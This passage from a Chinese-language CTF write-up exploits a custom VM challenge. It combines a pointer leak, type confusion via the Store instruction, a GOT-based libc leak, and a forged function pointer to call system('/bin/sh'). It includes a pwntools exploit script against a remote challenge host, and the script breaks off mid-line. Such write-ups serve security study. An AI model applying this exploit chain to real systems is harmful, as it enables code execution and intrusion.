<h4 id="4-Store-0xc4"><a href="#4-Store-0xc4" class="headerlink" title="4. Store (0xc4)"></a>4. Store (0xc4)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">指令格式: inst 196 &lt;dest&gt; &lt;src&gt;</span><br><span class="line">前提条件: values[dest].type == 1 (必须是指针)</span><br><span class="line">          values[src].type == 0 (必须是整数)</span><br><span class="line">功能: *((uint64_t*)values[dest].data) = values[src].data</span><br><span class="line">示例: inst 196 0 1  # *(Slot 0) = Slot 1</span><br></pre></td></tr></table></figure>

<p><strong>关键漏洞</strong>: 可以向<strong>任意可写地址</strong>写入8字节数据！</p>
<h4 id="5-Call-0x1b"><a href="#5-Call-0x1b" class="headerlink" title="5. Call (0x1b)"></a>5. Call (0x1b)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">指令格式: inst 27 &lt;func&gt; &lt;arg&gt;</span><br><span class="line">前提条件: values[func].type == 2 (必须是函数指针)</span><br><span class="line">功能: </span><br><span class="line">  - 如果values[arg].type == 0: call_func(values[arg].data)  (传值)</span><br><span class="line">  - 如果values[arg].type == 1: call_func(values[arg].data)  (传指针)</span><br><span class="line">示例: inst 27 1 4  # 调用 Slot1 指向的函数，参数为 Slot4</span><br></pre></td></tr></table></figure>

<p><strong>关键漏洞</strong>: 如果我们能控制一个slot的type&#x3D;2并设置其data为libc函数地址，就可以<strong>任意函数调用</strong>！</p>
<p>漏洞分析</p>
<ol>
<li>信息泄漏漏洞</li>
</ol>
<p><strong>位置</strong>: <code>vm_init @ 0x1253</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rand_slot = rand() % <span class="number">32</span>;</span><br><span class="line"><span class="keyword">if</span> (rand_slot &lt;= <span class="number">16</span>) </span><br><span class="line">    rand_slot += <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">values[rand_slot].type = <span class="number">1</span>;         <span class="comment">// 设置为指针类型</span></span><br><span class="line">values[rand_slot].data = &amp;values;   <span class="comment">// 指向values数组基址</span></span><br></pre></td></tr></table></figure>

<p><strong>影响</strong>:</p>
<ul>
<li>程序将<strong>values数组的基址</strong>存储在一个随机的slot中</li>
<li>通过<code>dbg</code>命令可以泄漏<code>rand_slot</code>的值</li>
<li>攻击者可以利用这个指针进行指针算术，访问程序中的任意内存</li>
</ul>
<p><strong>为什么这是漏洞</strong>:</p>
<ul>
<li>PIE随机化后，程序的绝对地址是未知的</li>
<li>但是<code>values[rand_slot]</code>指向了已知的相对偏移</li>
<li>通过指针算术 (Add指令)，可以计算出GOT表、其他全局变量等的地址</li>
<li>类型混淆漏洞</li>
</ul>
<p><strong>位置</strong>: Store指令 (<code>op_store @ 0x16e4</code>)</p>
<p><strong>漏洞原理</strong>:</p>
<ol>
<li><code>values</code>数组本身位于可写的<code>.bss</code>段 (地址 0x50c0)</li>
<li><code>rand_slot</code>指向<code>&amp;values</code>，是一个指针类型的slot</li>
<li>通过指针算术，我们可以计算出<code>&amp;values[i]</code>的地址</li>
<li>每个slot的前4字节是<code>type</code>字段</li>
<li>通过Store指令，我们可以写入任意slot的<code>type</code>字段</li>
</ol>
<p><strong>攻击步骤</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 假设 rand_slot = 18</span></span><br><span class="line"><span class="comment"># 目标: 修改 values[1].type = 2 (FuncPtr)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: 计算 &amp;values[1].type 的地址</span></span><br><span class="line"><span class="comment">#   &amp;values[1] = &amp;values + 16*1 = &amp;values + 16</span></span><br><span class="line"><span class="comment">#   我们需要一个指向这个地址的指针</span></span><br><span class="line"></span><br><span class="line">inst <span class="number">58</span> <span class="number">6</span> <span class="number">16</span>              <span class="comment"># Slot 6 = 16 (偏移)</span></span><br><span class="line">inst <span class="number">126</span> <span class="number">6</span> <span class="number">18</span> <span class="number">6</span>           <span class="comment"># Slot 6 = values + 16 = &amp;values[1]</span></span><br><span class="line">                          <span class="comment"># (因为Slot 18指向values，加上Int保持Ptr类型)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: 将值2写入 *Slot6</span></span><br><span class="line">inst <span class="number">58</span> <span class="number">7</span> <span class="number">2</span>               <span class="comment"># Slot 7 = 2</span></span><br><span class="line">inst <span class="number">196</span> <span class="number">6</span> <span class="number">7</span>              <span class="comment"># *(Slot 6) = 2</span></span><br><span class="line">                          <span class="comment"># 即 values[1].type = 2</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>任意代码执行漏洞</li>
</ol>
<p><strong>利用链</strong>:</p>
<ol>
<li><strong>泄漏Libc基址</strong>:<ol>
<li>通过指针算术访问GOT表</li>
<li>使用Load指令读取已解析的libc函数地址 (如<code>puts</code>)</li>
<li>计算libc基址</li>
</ol>
</li>
<li><strong>计算目标函数地址</strong>:<ol>
<li>根据libc偏移计算出<code>system</code>函数地址</li>
<li>将地址存储在某个slot中</li>
</ol>
</li>
<li><strong>类型伪造</strong>:<ol>
<li>使用类型混淆漏洞，将该slot的type修改为2 (FuncPtr)</li>
</ol>
</li>
<li><strong>触发执行</strong>:<ol>
<li>准备参数 (如字符串”&#x2F;bin&#x2F;sh”)</li>
<li>使用Call指令调用</li>
</ol>
</li>
</ol>
<p>利用流程</p>
<p>阶段1: 信息收集</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 泄漏rand_slot</span></span><br><span class="line">send(<span class="string">&quot;dbg&quot;</span>)</span><br><span class="line">out = recv()</span><br><span class="line">rand_slot = extract_randslot(out)  <span class="comment"># 例如: 18</span></span><br></pre></td></tr></table></figure>

<p>阶段2: 泄漏Libc地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># values数组位于 0x50c0</span></span><br><span class="line"><span class="comment"># puts@GOT位于 0x4f88</span></span><br><span class="line"><span class="comment"># 偏移: 0x4f88 - 0x50c0 = -312</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 计算puts@GOT地址的指针</span></span><br><span class="line">inst <span class="number">58</span> <span class="number">0</span> -<span class="number">312</span>           <span class="comment"># Slot 0 = -312</span></span><br><span class="line">inst <span class="number">126</span> <span class="number">0</span> <span class="number">18</span> <span class="number">0</span>          <span class="comment"># Slot 0 = &amp;values + (-312) = puts@GOT</span></span><br><span class="line">                         <span class="comment"># Slot 0 现在是Int类型，需要改为Ptr</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 修改Slot 0的类型为Ptr</span></span><br><span class="line"><span class="comment">#    &amp;values[0].type = &amp;values + 0</span></span><br><span class="line">inst <span class="number">58</span> <span class="number">31</span> <span class="number">1</span>             <span class="comment"># Slot 31 = 1 (Ptr类型)</span></span><br><span class="line">inst <span class="number">196</span> <span class="number">18</span> <span class="number">31</span>           <span class="comment"># *(&amp;values) = 1, 即 values[0].type = 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 解引用puts@GOT，读取puts函数地址</span></span><br><span class="line">inst <span class="number">82</span> <span class="number">1</span> <span class="number">0</span>              <span class="comment"># Slot 1 = *(puts@GOT) = puts_addr</span></span><br></pre></td></tr></table></figure>

<p>阶段3: 计算system地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># libc偏移 (根据libc.so.6符号表)</span></span><br><span class="line"><span class="comment"># puts_offset = 0x8e640</span></span><br><span class="line"><span class="comment"># system_offset = 0x5c4c0</span></span><br><span class="line"><span class="comment"># 差值 = -205184</span></span><br><span class="line"></span><br><span class="line">inst <span class="number">58</span> <span class="number">2</span> -<span class="number">205184</span>        <span class="comment"># Slot 2 = -205184</span></span><br><span class="line">inst <span class="number">126</span> <span class="number">1</span> <span class="number">1</span> <span class="number">2</span>           <span class="comment"># Slot 1 = puts_addr + (-205184) = system_addr</span></span><br></pre></td></tr></table></figure>

<p>阶段4: 准备参数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将字符串&quot;/bin/sh\x00&quot;放入内存</span></span><br><span class="line"><span class="comment"># &quot;/bin/sh\x00&quot; = 0x0068732f6e69622f (little-endian)</span></span><br><span class="line"></span><br><span class="line">inst <span class="number">58</span> <span class="number">3</span> <span class="number">29400045130965551</span>   <span class="comment"># Slot 3 = &quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算指向该字符串的指针</span></span><br><span class="line"><span class="comment"># Slot 3的data字段位于: &amp;values + 16*3 + 8 = &amp;values + 56</span></span><br><span class="line"></span><br><span class="line">inst <span class="number">58</span> <span class="number">5</span> <span class="number">56</span>             <span class="comment"># Slot 5 = 56</span></span><br><span class="line">inst <span class="number">126</span> <span class="number">4</span> <span class="number">18</span> <span class="number">5</span>          <span class="comment"># Slot 4 = &amp;values + 56 = &amp;(Slot 3.data)</span></span><br></pre></td></tr></table></figure>

<p>阶段5: 类型伪造</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改Slot 1的类型为FuncPtr (type=2)</span></span><br><span class="line"><span class="comment"># &amp;values[1].type = &amp;values + 16</span></span><br><span class="line"></span><br><span class="line">inst <span class="number">58</span> <span class="number">6</span> <span class="number">16</span>             <span class="comment"># Slot 6 = 16</span></span><br><span class="line">inst <span class="number">126</span> <span class="number">6</span> <span class="number">18</span> <span class="number">6</span>          <span class="comment"># Slot 6 = &amp;values + 16</span></span><br><span class="line">inst <span class="number">58</span> <span class="number">7</span> <span class="number">2</span>              <span class="comment"># Slot 7 = 2 (FuncPtr)</span></span><br><span class="line">inst <span class="number">196</span> <span class="number">6</span> <span class="number">7</span>             <span class="comment"># *(Slot 6) = 2, values[1].type = 2</span></span><br></pre></td></tr></table></figure>

<p>阶段6: 触发执行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">inst <span class="number">27</span> <span class="number">1</span> <span class="number">4</span>              <span class="comment"># call system(&quot;/bin/sh&quot;)</span></span><br><span class="line">                         <span class="comment"># Slot 1 = system地址 (type=2)</span></span><br><span class="line">                         <span class="comment"># Slot 4 = 指向&quot;/bin/sh&quot;的指针 (type=1)</span></span><br></pre></td></tr></table></figure>

<p><strong>成功获取root shell！</strong></p>
<p>总结与建议</p>
<p>关键漏洞总结</p>
<ol>
<li><strong>设计缺陷</strong>: 将敏感指针 (<code>&amp;values</code>) 暴露给虚拟机</li>
<li><strong>类型系统缺陷</strong>: 类型标记存储在可写内存中，可被篡改</li>
<li><strong>缺乏隔离</strong>: VM的内存与元数据混合存储</li>
<li><strong>不完整的验证</strong>: Store指令不验证写入地址的合法性</li>
</ol>
<p>安全建议</p>
<p>如果要修复此程序，建议:</p>
<ol>
<li><strong>隔离元数据</strong>: 将type字段存储在单独的只读数组中</li>
<li><strong>移除信息泄漏</strong>: 不要将系统指针暴露给VM</li>
<li><strong>沙箱化</strong>: 限制VM只能访问专用的堆区域</li>
<li><strong>禁用危险操作</strong>: 移除或严格限制Call指令</li>
<li><strong>地址空间随机化</strong>: 即使泄漏了PIE基址，也应该对敏感结构进行额外的随机化</li>
</ol>
<p>技术亮点</p>
<p>本次exploit展示了:</p>
<ul>
<li><strong>类型混淆</strong> (Type Confusion) 攻击技术</li>
<li><strong>指针算术</strong> 在受限环境中的应用</li>
<li><strong>多阶段ROP</strong> 思想在VM环境中的实现</li>
<li><strong>精确的内存布局</strong> 分析</li>
</ul>
<p>A. 关键地址</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>地址</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>values</td>
<td>0x50c0</td>
<td>Slot数组 (32 x 16字节)</td>
</tr>
<tr>
<td>program</td>
<td>0x52c0</td>
<td>指令数组 (64 x 24字节)</td>
</tr>
<tr>
<td>inst_count</td>
<td>0x58c0</td>
<td>已添加的指令数</td>
</tr>
<tr>
<td>rand_slot</td>
<td>0x5ce0</td>
<td>随机选择的slot索引</td>
</tr>
<tr>
<td>puts@GOT</td>
<td>0x4f88</td>
<td>puts函数的GOT表项</td>
</tr>
</tbody></table>
<p>B. Opcode编码规则</p>
<p>通过逆向<code>decode_opcode @ 0x1a81</code>，发现opcode编码使用了复杂的跳转表混淆:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">; 伪代码</span><br><span class="line">index = (opcode &amp; 0xF) ^ some_transform</span><br><span class="line">jmp [interrupt_vector_table + index * 8]</span><br></pre></td></tr></table></figure>

<p>实际映射通过暴力测试确定（见<code>full_opcode_search.py</code>）。</p>
<p>C. 测试环境</p>
<ul>
<li><strong>系统</strong>: Ubuntu 22.04 LTS (WSL2)</li>
<li><strong>GCC</strong>: 11.4.0</li>
<li><strong>Libc</strong>: 2.35 (但题目提供了特定的libc.so.6)</li>
<li><strong>工具</strong>: IDA Pro, pwntools, Python 3</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Micro_Macro! PWN Exploit</span></span><br><span class="line"><span class="string">使用pwntools打远程</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;info&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== 配置 ==========</span></span><br><span class="line">REMOTE_HOST = <span class="string">&quot;nc1.ctfplus.cn&quot;</span>  <span class="comment"># 修改为实际的远程主机</span></span><br><span class="line">REMOTE_PORT = <span class="number">20809</span>          <span class="comment"># 修改为实际的远程端口</span></span><br><span class="line">LOCAL_BIN = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">LIBC_FILE = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Opcode映射</span></span><br><span class="line">OP_SETIMM = <span class="number">0x3a</span>   <span class="comment"># 58  - SetImm</span></span><br><span class="line">OP_ADD    = <span class="number">0x7e</span>   <span class="comment"># 126 - Add</span></span><br><span class="line">OP_CMOV   = <span class="number">0x91</span>   <span class="comment"># 145 - CMOV</span></span><br><span class="line">OP_LOAD   = <span class="number">0x52</span>   <span class="comment"># 82  - Load</span></span><br><span class="line">OP_STORE  = <span class="number">0xc4</span>   <span class="comment"># 196 - Store</span></span><br><span class="line">OP_CALL   = <span class="number">0x1b</span>   <span class="comment"># 27  - Call</span></span><br><span class="line">OP_PRINT  = <span class="number">0x68</span>   <span class="comment"># 104 - Print</span></span><br><span class="line">OP_EXIT   = <span class="number">0xaf</span>   <span class="comment"># 175 - Exit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 偏移量</span></span><br><span class="line">OFFSET_PUTS_GOT = -<span class="number">312</span>  <span class="comment"># 0x4f88 - 0x50c0</span></span><br><span class="line">OFFSET_SYSTEM_FROM_PUTS = <span class="number">0x5c4c0</span> - <span class="number">0x8e640</span>  <span class="comment"># -205184</span></span><br><span class="line">BINSH_STR = <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">BINSH_INT = u64(BINSH_STR)  <span class="comment"># 0x0068732f6e69622f</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== 连接函数 ==========</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_connection</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = remote(REMOTE_HOST, REMOTE_PORT)</span><br><span class="line">        <span class="keyword">return</span> io</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        error(<span class="string">f&quot;连接失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== Exploit ==========</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">io</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;执行exploit&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># ===== 步骤1: 泄漏rand_slot =====</span></span><br><span class="line">    success(<span class="string">&quot;步骤1: 泄漏rand_slot&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>, timeout=<span class="number">2</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;dbg&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;rand_slot = &#x27;</span>, timeout=<span class="number">2</span>)</span><br><span class="line">    rand_slot = <span class="built_in">int</span>(io.recvline().strip())</span><br><span class="line">    success(<span class="string">f&quot;rand_slot = <span class="subst">&#123;rand_slot&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 等待下一个提示符</span></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>, timeout=<span class="number">2</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># ===== 步骤2: 构造利用指令 =====</span></span><br><span class="line">    success(<span class="string">&quot;步骤2: 构造利用链&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send_inst</span>(<span class="params">inst_str</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;发送指令并等待OK&quot;&quot;&quot;</span></span><br><span class="line">        io.sendline(inst_str.encode())</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = io.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>, timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;[-]&#x27;</span> <span class="keyword">in</span> result <span class="keyword">or</span> <span class="string">b&#x27;Invalid&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">                error(<span class="string">f&quot;指令失败: <span class="subst">&#123;inst_str&#125;</span>&quot;</span>)</span><br><span class="line">                error(<span class="string">f&quot;响应: <span class="subst">&#123;result.decode(errors=<span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            error(<span class="string">f&quot;接收响应超时: <span class="subst">&#123;inst_str&#125;</span>&quot;</span>)</span><br><span class="line">            error(<span class="string">f&quot;异常: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构造指令序列</span></span><br><span class="line">    instructions = [</span><br><span class="line">        <span class="comment"># 2.1 计算puts@GOT地址</span></span><br><span class="line">        <span class="string">f&quot;inst <span class="subst">&#123;OP_SETIMM&#125;</span> 0 <span class="subst">&#123;OFFSET_PUTS_GOT&#125;</span>&quot;</span>,</span><br><span class="line">        <span class="string">f&quot;inst <span class="subst">&#123;OP_ADD&#125;</span> 0 <span class="subst">&#123;rand_slot&#125;</span> 0&quot;</span>,</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 2.2 设置Slot 0类型为Ptr</span></span><br><span class="line">        <span class="string">f&quot;inst <span class="subst">&#123;OP_SETIMM&#125;</span> 31 1&quot;</span>,</span><br><span class="line">        <span class="string">f&quot;inst <span class="subst">&#123;OP_STORE&#125;</span> <span class="subst">&#123;rand_slot&#125;</span> 31&quot;</span>,</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 2.3 读取puts地址</span></span><br><span class="line">        <span class="string">f&quot;inst <span class="subst">&#123;OP_LOAD&#125;</span> 1 0&quot;</span>,</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 2.4 计算system地址</span></span><br><span class="line">        <span class="string">f&quot;inst <span class="subst">&#123;OP_SETIMM&#125;</span> 2 <span class="subst">&#123;OFFSET_SYSTEM_FROM_PUTS&#125;</span>&quot;</span>,</span><br><span class="line">        <span class="string">f&quot;inst <span class="subst">&#123;OP_ADD&#125;</span> 1 1 2&quot;</span>,</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 2.5 布置/bin/sh字符串</span></span><br><span class="line">        <span class="string">f&quot;inst <span class="subst">&#123;OP_SETIMM&#125;</span> 3 <span class="subst">&#123;BINSH_INT&#125;</span>&quot;</span>,</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 2.6 计算/bin/sh指针</span></span><br><span class="line">        <span class="string">f&quot;inst <span class="subst">&#123;OP_SETIMM&#125;</span> 5 56&quot;</span>,</span><br><span class="line">        <span class="string">f&quot;inst <span class="subst">&#123;OP_ADD&#125;</span> 4 <span class="subst">&#123;rand_slot&#125;</span> 5&quot;</span>,</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 2.7 设置Slot 1类型为FuncPtr</span></span><br><span class="line">        <span class="string">f&quot;inst <span class="subst">&#123;OP_SETIMM&#125;</span> 6 16&quot;</span>,</span><br><span class="line">        <span class="string">f&quot;inst <span class="subst">&#123;OP_ADD&#125;</span> 6 <span class="subst">&#123;rand_slot&#125;</span> 6&quot;</span>,</span><br><span class="line">        <span class="string">f&quot;inst <span class="subst">&#123;OP_SETIMM&#125;</span> 7 2&quot;</span>,</span><br><span class="line">        <span class="string">f&quot;inst <span class="subst">&#123;OP_STORE&#125;</span> 6 7&quot;</span>,</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 2.8 调用system(&quot;/bin/sh&quot;)</span></span><br><span class="line">        <span class="string">f&quot;inst <span class="subst">&#123;OP_CALL&#125;</span> 1 4&quot;</span>,</span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 发送所有指令</span></span><br><span class="line">    info(<span class="string">f&quot;发送 <span class="subst">&#123;<span class="built_in">len</span>(instructions)&#125;</span> 条指令...&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i, inst <span class="keyword">in</span> <span class="built_in">enumerate</span>(instructions, <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> send_inst(inst):</span><br><span class="line">            error(<span class="string">f&quot;指令 #<span class="subst">&#123;i&#125;</span> 失败&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        info(<span class="string">f&quot;[<span class="subst">&#123;i&#125;</span>/<span class="subst">&#123;<span class="built_in">len</span>(instructions)&#125;</span>] <span class="subst">&#123;inst[:<span class="number">50</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    success(<span class="string">&quot;所有指令发送成功!&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># ===== 步骤3: 执行run触发exploit =====</span></span><br><span class="line">    success(<span class="string">&quot;步骤3: 执行run触发exploit&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;run&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># ===== 步骤4: 获取shell =====</span></span><br><span class="line">    success(<span class="string">&quot;步骤4: 获取shell&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 等待一下让system执行</span></span><br><span class="line">    time.sleep(<span 